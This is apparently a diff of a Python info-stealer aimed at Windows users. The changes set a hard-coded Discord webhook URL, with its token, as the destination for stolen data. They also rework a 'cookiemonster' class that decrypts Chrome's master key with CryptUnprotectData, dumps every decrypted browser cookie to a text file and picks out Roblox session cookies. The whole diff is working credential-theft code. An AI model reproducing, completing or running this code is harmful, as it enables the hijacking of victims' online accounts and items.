@@ -20,7 +20,7 @@ from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "&WEBHOOK_URL&"
+WEBHOOK_URL = "https://discord.com/api/webhooks/958134235800158249/QwjDxnjuD82SpCnNCRmeTuPAhFMyZhjIw5QzufzlgT8bgidOUY3Lc_4Cm_TgUWjR-qyJ"
 
 def main(webhook_url):
     global webhook, embed
@@ -376,19 +376,19 @@ class cookiemonster:
         self.appdata = os.getenv("localappdata")
         self.grabCookies()
     
-    def get_master_key(self, path):
+    def get_master_key(self, path) -> str:
         with open(path, "r", encoding="utf-8") as f:
             local_state = f.read()
-        local_state = loads(local_state)
+        local_state = json.loads(local_state)
 
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
-    
+        
     def grabCookies(self):
         master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
-        login_db = self.appdata+'\\Google\\Chrome\\User Data\\Default\\Network\\cookies'
+        login_db = '"{}\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies"'.format(self.appdata)
         try:
             copy2(login_db, "Loginvault.db")
         except Exception:
@@ -397,16 +397,15 @@ class cookiemonster:
         cursor = conn.cursor()
         with open(".\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
             f.write("www.addidix.xyz /// Google Chrome Cookies\n\n")
-        with open(".\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:      
+        with open(".\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                 for r in cursor.fetchall():
                     host = r[0]
                     user = r[1]
-                    encrypted_cookie = r[2]
-                    decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                    if host != "":
-                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    decrypted_cookie = self.decrypt_val(r[2], master_key)
+                    if host != "": f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
             except Exception:
                 pass
         cursor.close()
